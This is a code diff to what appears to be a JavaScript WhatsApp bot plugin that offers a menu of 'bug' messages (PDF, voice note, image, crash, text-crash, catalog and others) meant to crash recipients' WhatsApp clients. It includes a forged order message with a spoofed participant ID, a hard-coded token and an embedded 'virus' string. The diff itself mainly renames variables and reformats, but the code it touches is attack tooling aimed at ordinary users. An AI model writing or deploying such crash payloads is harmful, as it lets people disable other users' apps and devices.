@@ -13,9 +13,9 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 
 	const from = m.key.remoteJid
 	//const participants = m.isGroup ? await groupMetadata.participants : ''
-	let q = `Bug Tag From ${author}\n${text}`
+	let q = `Bug Tag From ${titlebot}\n${text}`
 	let sections = [{
-		title: `Created by ${packname2}`,
+		title: `Created by ${wm2}`,
 		rows: [
 			{ title: 'Bug PDF', rowId: `${_p + command} pdf ${text}` },
 			{ title: 'Bug VN', rowId: `${_p + command} vn ${text}` },
@@ -23,7 +23,7 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 			{ title: 'Bug Image', rowId: `${_p + command} bugimg ${text}` },
 			{ title: 'Bug Video', rowId: `${_p + command} bugvid ${text}` },
 			{ title: 'Bug Crash', rowId: `${_p + command} bugcrash ${text}` },
-			{ title: 'Bug Kontak', rowId: `${_p + command} bugkontak ${text}` },
+			//{ title: 'Bug Kontak', rowId: `${_p + command} bugkontak ${text}` },
 			{ title: 'Bug ReactPc', rowId: `${_p + command} reactpc ${text}` },		
 			{ title: 'Bug Catalog', rowId: `${_p + command} bugcatalog ${text}` },
 			{ title: 'Bug TextCrash', rowId: `${_p + command} bugtextcrash ${text}` },
@@ -31,7 +31,7 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 	}]
 	let listMessage = {
 		text: '*[ List Bug ]*\n\n*Note :* Jangan Asal Kirim ke orang yg tidak bersalah',
-		footer: packname2,
+		footer: botdate,
 		buttonText: 'Silahkan Klik Di Sini',
 		sections
 	}
@@ -70,15 +70,18 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 	//#Troli 2
 	const ftrolii = { key: { fromMe: false, "participant":"0@s.whatsapp.net", "remoteJid": "@g.us"},
 	"message": {
-		orderMessage: { 		itemCount: fsizedoc,
-			status: 200, 		thumbnail: thumb, 		surface: 200, 		message: `© ${wm}`,
+		orderMessage: { 		
+			itemCount: fsizedoc,
+			status: 200, 		
+			thumbnail: thumb, 		
+			surface: 200, 		
+			message: `© ${wm}`,
 			token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 			totalAmount1000: fsizedoc,
 			totalCurrencyCode: "IDR",
 			orderTitle: `${wm} ${virus2}`,
-			sellerJid: '0@s.whatsapp.net'}}, 		contextInfo: { "forwardingScore":999,"isForwarded":true },
-		sendEphemeral: true
-	}	
+			sellerJid: '0@s.whatsapp.net'}}, contextInfo: { "forwardingScore":999,"isForwarded":true }, sendEphemeral: true
+		}	
 	//=================================================//	
 	//# Sticker
 	const bugstik = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) }, "message": {
